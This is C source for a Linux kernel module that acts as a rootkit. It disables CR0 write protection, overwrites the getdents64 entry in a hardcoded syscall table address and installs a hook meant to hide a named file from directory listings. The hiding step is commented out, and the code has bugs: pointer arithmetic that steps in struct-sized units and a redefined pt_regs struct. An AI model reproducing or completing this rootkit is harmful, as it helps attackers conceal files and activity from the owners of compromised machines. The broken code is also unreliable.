#include <linux/module.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>
#include <asm/ptrace.h>
#include <linux/uaccess.h>
 
int new_getdents64(const struct pt_regs *regs);
int load(void);
void unload(void);

struct pt_regs {
/*
 * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
 * unless syscall needs a complete, fully filled "struct pt_regs".
 */
	unsigned long r15;
	unsigned long r14;
	unsigned long r13;
	unsigned long r12;
	unsigned long rbp;
	unsigned long rbx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
	unsigned long r11;
	unsigned long r10;
	unsigned long r9;
	unsigned long r8;
	unsigned long rax;
	unsigned long rcx;
	unsigned long rdx;
	unsigned long rsi;
	unsigned long rdi;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it's IRQ number:
 */
	unsigned long orig_rax;
/* Return frame for iretq */
	unsigned long rip;
	unsigned long cs;
	unsigned long eflags;
	unsigned long rsp;
	unsigned long ss;
/* top of stack page */
};

typedef asmlinkage int (*original_getdents64_t)(const struct pt_regs *regs);
static unsigned long *syscall_table = (unsigned long *)0xffffffff842001a0; 
static original_getdents64_t original_getdents64_ptr;
static char *file_name_to_hide = "ThisIsATest.txt";
 
static inline void wp_cr0(unsigned long val) {
    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
}

static inline void zero_cr0(void) {
    printk(KERN_ALERT "Unprotecting mem!");
    wp_cr0(read_cr0() & (~0x10000));
}

static inline void one_cr0(void) {
    printk(KERN_ALERT "Protecting mem...");
    wp_cr0(read_cr0() | 0x10000);
}

asmlinkage int new_getdents64(const struct pt_regs *regs) {
    int total_bytes_read = (int)original_getdents64_ptr(regs);
    struct linux_dirent64 *buff = (struct linux_dirent64*)((char*)regs->rsi);

    if (total_bytes_read > 0) {
        printk(KERN_ALERT "Total bytes read: %d", total_bytes_read);
        printk(KERN_ALERT "Buffer pointer: %p", buff);

        struct linux_dirent64 *first, *curr, *next;
        first = kvmalloc(total_bytes_read, GFP_KERNEL);
        copy_from_user((void *)first, buff, (unsigned long)total_bytes_read);
        curr = first;

        int i = 0;
        while ((i < total_bytes_read) && (curr->d_reclen > 0)) {   
            int size = sizeof(struct linux_dirent64);
            printk(KERN_ALERT "Size of linux dirent: %d", size);
            unsigned short curr_len = curr->d_reclen;
            char *name = curr->d_name;
            printk(KERN_ALERT "Original: %p. Index: %d, Name: %s Current pointer: %p has length: %d", first, i, name, curr, curr_len);
            if (!strcmp(name, file_name_to_hide)) {
            // File matches name to hide, we need to delete it from the array.
                printk(KERN_ALERT "FOUND YOU!");
        //         int length_to_copy = total_bytes_read - i - curr_length;
        //         memmove(curr, next, length_to_copy);

        //         // Array has been shortened by the length of the member we've just deleted.
        //         total_bytes_read -= curr_length;
            }
            curr += curr_len;
            i += curr_len;
        //     // Add the bytes read to si so buff will point to the next member in the array.
        //     curr = next;
        }
    }

    return total_bytes_read;
}
 
int load(void) {
    printk(KERN_ALERT "Initializing...");
    zero_cr0();
    original_getdents64_ptr = (original_getdents64_t)syscall_table[__NR_getdents64];
    printk(KERN_ALERT "%p OWP", original_getdents64_ptr);
    syscall_table[__NR_getdents64] = (unsigned long)new_getdents64;
    printk(KERN_ALERT "Overrided getdents64 ptr!");
    one_cr0();
    printk(KERN_ALERT "Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    printk(KERN_ALERT "Shutting down.");
    zero_cr0();
    syscall_table[__NR_getdents64] = (unsigned long)original_getdents64_ptr;  
    one_cr0();
    printk(KERN_ALERT "Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");